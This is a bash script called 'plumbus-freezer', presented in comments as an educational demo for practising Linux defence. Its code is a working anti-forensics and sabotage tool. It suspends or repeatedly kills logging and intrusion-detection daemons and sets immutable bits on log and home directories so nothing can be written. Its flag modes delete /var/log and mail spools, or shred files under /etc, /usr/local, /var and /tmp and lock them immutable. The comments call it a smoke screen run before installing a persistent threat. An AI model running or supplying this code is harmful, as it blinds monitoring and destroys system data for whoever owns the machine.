#!/usr/bin/env bash

# Any system with gdb installed on it will get the full functionality.
# If gdb is not present it will run without it.

# nasty demo script here for running a muck - for educational purposes.

          # A good test of your (auditd, selinux, monit, filesystem firewall, virtualization) skills is to defend against it.
          # Try to build an auditd configuration that can report 
          # plumbus-freezer type things (logging disabler).
          # So watching for the activity is easy enough with auditd, but the plumbus-freezer still 
          # stops most auditd configurations because the data from auditd is supposed to be stored
          # in /var/log/audit by default and plumbus-freezer prevents that directory from being
          # written to! So example first step is building a remote/shadow/sub/hypervisor system to 
          # collect auditd information from a protected socket... or just a different partition at least.
          # Then react? Go kubernetes go? Or monit reaction? FreeBSD MAC it? Most likely this level of reactiveness
          # is not needed. But if you have a really wild environment, then maybe.
          # Warning: using a filesystem firewall like MAC can lock you out of a system!

# plumbus-freezer should be executed as root in most instances to demostrate the damage potential of root.
# And also, be careful people, this can shreck a system up. That is the point. 
# Use a non-prod VM or something with snapshots.

# The plubmus-freezer is made to stop logging and programs in their tracks for 9 minutes, then give them the resume,
# if they can recover! If you activate the commented out freeze3 function, the entire system may crash in some cases.
# And the system might crash anyway, depending on how it is engineered. The plumbus-freezer prevents standard logging
# with the use of the immutable bit. To remove the immutable bit:

# chattr -i $thing

# Recursively:

# chattr -R -i $directory

# If you pass the -darkplumbus flags, the program deletes the log and mail files as well and doesn't resume.
# If you pass the -redplumbus flags, the program shreds system configuration files right before the resume.


# Warning: This is not something you want for your system. This is like a smoke screen for Linux intrusion template.
# Like the thing a bad guy might run before he installs the persistent threat.

killloop () {
resume=$((SECONDS+540))
while [ $SECONDS -lt $resume ]; do
  pkill -9 $target1 $target2 $target3 $target4; 
   # to be compatible with those wierd old sleeps that don't have decimals we || to 1, but 0.9 is better tuned
   # give a little sleep as to not raise the CPU
  sleep 0.9 || sleep 1
  # If the target machine is powerful, lower the sleep or remove it. Basically trying to keep the app under
  # even if (supervisord, monit etc) restarts it. Some will have leakage out to their remote host, but
  # without an app monitor, you won't have that 0.3 second or whatever time when syslog can ship out a message and it will
  # just be down. Remove the sleep and even the app monitor won't get it up to leak alerts up but the CPU will spike. And 
  # sometimes people watch CPU usage :)
done
}

dpkillloop () {
while true; do
  pkill -9 $target1 $target2 $target3 $target4; 
  # to be compatible with those wierd old sleeps that don't have decimals we || to 1, but 0.9 is better tuned
  # give a little sleep as to not raise the CPU
  sleep 0.9 || sleep 1
  # If the target machine is powerful, lower the sleep or remove it. Basically trying to keep the app under
  # even if (supervisord, monit etc) restarts it. Some will have leakage out to their remote host, but
  # without an app monitor, you won't have that 0.3 second or whatever time when syslog can ship out a message and it will
  # just be down. Remove the sleep and even the app monitor won't get it up to leak alerts but the CPU will spike. And 
  # sometimes people watch CPU usage :)
done
}

freeze1 () {
  target1=rsyslog
  target2=sec
  target3=ossec
  target4=syslog
  pgrep -x rsyslog | xargs gdb -p || killloop 2>/dev/null  
  pgrep -x sec | xargs gdb -p || killloop 2>/dev/null
  pgrep -x ossec | xargs gdb -p || killloop 2>/dev/null
  pgrep -x syslog | xargs gdb -p || killloop 2>/dev/null
}

# The darkplumbus freezes that don't stop.

dpfreeze1 () {
  target1=rsyslog
  target2=sec
  target3=ossec
  target4=syslog
  pgrep -x rsyslog | xargs gdb -p || dpkillloop 2>/dev/null
  pgrep -x sec | xargs gdb -p || dpkillloop 2>/dev/null
  pgrep -x ossec | xargs gdb -p || dpkillloop 2>/dev/null
  pgrep -x syslog | xargs gdb -p || dpkillloop 2>/dev/null
}

freeze3 () {
for x in $(pgrep . | grep -v $$); do

  # Uncomment any of these that you really want to hit hard.
  # Many situations this freeze3 function crashes a system!

  # For this reason this function is commented out in the main below
  # and needs to be manually brought in to be used.

  #pgrep -x ufw | xargs gdb -p || pkill -9 ufw 2>/dev/null
  #pgrep -x firewalld | xargs gdb -p || pkill -9 firewalld 2>/dev/null
  #pgrep -x sendmail | xargs gdb -p || pkill -9 sendmail 2>/dev/null
  #pgrep -x postfix | xargs gdb -p || pkill -9 postfix 2>/dev/null
  #pgrep -x java | xargs gdb -p || pkill -9 java 2>/dev/null
  #pgrep -x python | xargs gdb -p || pkill -9 python 2>/dev/null
  #pgrep -x python3 | xargs gdb -p || pkill -9 python3 2>/dev/null
  #pgrep -x ruby | xargs gdb -p || pkill -9 ruby 2>/dev/null

  # freeze up everything but plumbus-freezer pid

  gdb -p $x 2>/dev/null &
  
done
}

freeze4 () {
  chattr -R +i /var/log /home /root 2>/dev/null
}

freeze5 () {
  chattr -R +i /opt /var /tmp 2>/dev/null
}

unfreeze () {
  pkill -9 gdb
  # comment this next line out to leave the immutable bit on after unfreeze, reckless things, chaos stewing
  chattr -R -i /
}

cleanout () {
  rm -rf /var/log/
  rm -rf /var/spool/mail/*
}

main () {
case "$1" in
  -redplumbus)
    freeze1 &
#    freeze3 &
    freeze4 &
    freeze5 &
    sleep 540 &&
    shred /etc/* &
    shred /etc/*/* &
    shred /etc/*/*/* &
    shred /usr/local/*/* &
    shred /var/*/*/* &
    shred /tmp/* &
    sleep 1 &&
    # a little extra sauce to make the shredded files immutable 
    # so that someone has to undo that before restoring if not in container/snapshot
    chattr +i /etc/* &
    chattr +i /etc/*/* &
    chattr +i /etc/*/*/* &
    chattr +i /usr/local/*/* &
    chattr +i /var/*/*/* &
    chattr +i /tmp/* &
    unfreeze
;;
  -darkplumbus)
    dpfreeze1 &
    cleanout &
#    freeze3 &
    freeze4 &
    freeze5 &
;;
*)
  freeze1 &
#  freeze3 &
  freeze4 &
  freeze5 &
  sleep 540 && unfreeze

esac
}

checkplumbusfreezer () {
  s="$(which gdb)"
  if [ -z $s ]; then
    echo "Running without gdb!"
    main "$1" 2>/dev/null &
  else
    main "$1" 2>/dev/null &
  fi
}

